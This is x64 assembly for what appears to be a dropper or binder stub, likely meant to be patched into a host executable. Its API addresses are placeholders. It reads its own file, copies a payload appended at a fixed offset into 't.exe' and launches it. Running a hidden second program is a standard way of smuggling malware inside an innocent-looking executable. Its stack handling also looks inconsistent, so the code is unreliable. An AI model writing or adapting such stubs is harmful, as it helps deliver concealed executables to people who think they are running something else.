[BITS 64]

extern_value equ 0x33333333
%macro EXTERN_CALL 0	; machine code for (call [rip + const])
	db 0xFF, 0x15
	dd extern_value
%endmacro

; start
push rax
push rcx
push rdx

jmp readonly_data_end
	out_path db 't', 0, '.', 0, 'e', 0, 'x', 0, 'e', 0, 0, 0
readonly_data_end:

; stack variables
param_5 equ 32
param_6 equ 40
param_7 equ 48
hinfile equ 56
houtfile equ 60
check equ 64
temp_byte equ 68
byte_read equ 69
file_path equ 72 
path_length equ (240-72)/2
sub rsp, 240

; GetModuleFileNameW
mov rcx, 0
lea rdx, [rsp + file_path]
mov r8, path_length
EXTERN_CALL

; CreateFileW (input)
lea rcx, [rsp + file_path]
mov rdx, 0x80000000	; GENERIC_READ
mov r8, 0
mov r9, 0
mov qword [rsp + param_5], 3	; OPEN_EXISTING
mov qword [rsp + param_6], 0x80	; FILE_ATTRIBUTE_NORMAL
mov qword [rsp + param_7], 0
EXTERN_CALL
mov [rsp + hinfile], eax

; SetFilePointer (end of input exe)
movsxd rcx, eax
mov rdx, extern_value
mov r8, 0
mov r9, 0	; FILE_BEGIN
EXTERN_CALL

; CreateFileW (output)
lea rcx, [rel out_path]
mov rdx, 0x40000000	; GENERIC_WRITE
mov r8, 0
mov r9, 0
mov qword [rsp + param_5], 2	; CREATE_ALWAYS
mov qword [rsp + param_6], 0x80	; FILE_ATTRIBUTE_NORMAL
mov qword [rsp + param_7], 0
EXTERN_CALL
mov [rsp + houtfile], eax

; copy byte-by-byte
mov qword [rsp + param_5], 0
mov byte [rsp + check], 1

loop_start:
cmp dword [rsp + check], 0
je loop_end

	; read from input
	movsxd rcx, dword [rsp + hinfile]
	lea rdx, [rsp + byte_read]
	mov r8, 1	; bytes to read
	lea r9, [rsp + check]	; if read or not
	EXTERN_CALL

	; write to output
	movsxd rcx, dword [rsp + houtfile]
	lea rdx, [rsp + byte_read]
	movsxd r8, dword [rsp + check]	; bytes to write
	mov r9, 0
	EXTERN_CALL
	
jmp loop_start
loop_end:

; close files
mov rcx, [rsp + hinfile]
EXTERN_CALL

mov rcx, [rsp + houtfile]
EXTERN_CALL

; execute copied exe
mov rcx, 0
mov rdx, 0
lea r8, [rel out_path]
mov r9, 0
mov qword [rsp + param_5], 0
mov qword [rsp + param_6], 1
EXTERN_CALL

; end
add rsp, 80

pop rdx
pop rcx
pop rax